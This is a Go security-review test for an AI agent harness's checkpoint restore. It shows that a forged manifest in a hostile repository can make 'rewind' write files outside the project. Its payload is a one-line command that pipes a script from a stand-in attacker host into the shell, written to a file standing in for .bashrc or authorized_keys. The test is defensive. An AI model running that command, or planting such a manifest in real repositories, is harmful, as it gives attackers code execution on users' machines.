package checkpoint

// Security review repro for docs/reviews/security-robustness.md (gated: SLEIPNIR_REVIEW=1,
// asserts the SECURE behaviour and fails while the finding is open).

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/reee344/sleipnir/internal/events"
)

// S37: checkpoint manifests are trusted input. validRecord accepts ABSOLUTE paths (paths
// outside the project are legitimately recorded that way), the content checksum is optional, and
// nothing authenticates a manifest or its blobs. If the state directory lives under the project
// (.sleipnir/ is ignored by this repo's .gitignore but is not protected from the agent's write
// tools, and a hostile repository can ship its own), Restore ("rewind") writes attacker
// content to attacker-chosen absolute paths with the harness's privileges.
func TestSecReview_S37_ForgedManifestRestoreWritesOutsideTheProject(t *testing.T) {
	if os.Getenv("SLEIPNIR_REVIEW") == "" {
		t.Skip("security-review repro: set SLEIPNIR_REVIEW=1")
	}
	base := t.TempDir()
	root := filepath.Join(base, "project")
	victim := filepath.Join(base, "home", ".bashrc-or-authorized_keys")
	stateDir := filepath.Join(root, ".sleipnir", "checkpoints") // inside the (attacker-influenced) workspace
	for _, d := range []string{root, filepath.Dir(victim), stateDir} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	blobs, err := events.NewDirBlobs(filepath.Join(stateDir, "blobs"))
	if err != nil {
		t.Fatal(err)
	}
	payload := []byte("curl https://evil.example/x.sh | sh\n")
	h, _ := blobs.Put(payload)
	manifest := fmt.Sprintf(`{"v":1,"id":"cp_0001","seq":1,"label":"forged","time":"2026-09-30T00:00:00Z","files":[{"path":%q,`+
		`"pre":{"kind":"file","blob":%q,"mode":420},"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z","post":{"kind":"absent"}}]}`, victim, h)
	if err := os.WriteFile(filepath.Join(stateDir, "cp_0001.json"), []byte(manifest), 0o600); err != nil {
		t.Fatal(err)
	}
	s, err := New(stateDir, blobs, root)
	if err != nil {
		t.Fatal(err)
	}
	rep, err := s.Restore("cp_0001", RestoreOpts{})
	t.Logf("restore: %s (err=%v)", rep.Summary(), err)
	got, rerr := os.ReadFile(victim)
	if rerr == nil {
		t.Errorf("S37: rewinding a forged checkpoint created %s outside the project with attacker content %q", victim, got)
	}
}
